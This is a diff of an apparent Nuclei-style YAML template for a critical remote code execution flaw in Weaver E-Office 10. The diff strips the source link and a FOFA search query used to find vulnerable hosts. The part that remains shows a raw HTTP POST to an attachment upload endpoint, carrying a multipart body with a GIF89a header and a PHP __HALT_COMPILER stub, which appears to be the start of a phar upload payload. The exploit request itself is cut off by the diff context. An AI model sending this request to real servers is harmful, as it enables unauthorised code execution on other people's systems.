@@ -3,12 +3,8 @@ info:
   name: 泛微E-Office10版本小于v10.0_20240222 远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dqwpmbgr61h96wak'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dqwpmbgr61h96wak
-    fofa: app="泛微-EOffice"或body="eoffice_loading_tip" && body="eoffice10"
 http:
 - raw:
   - 'POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
@@ -23,8 +19,6 @@ http:
     Content-Type: multipart/form-data; boundary=jzdwsbic
 
 
-
-
     --jzdwsbic
 
 
@@ -32,8 +26,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     GIF89a<?php __HALT_COMPILER(); ?>
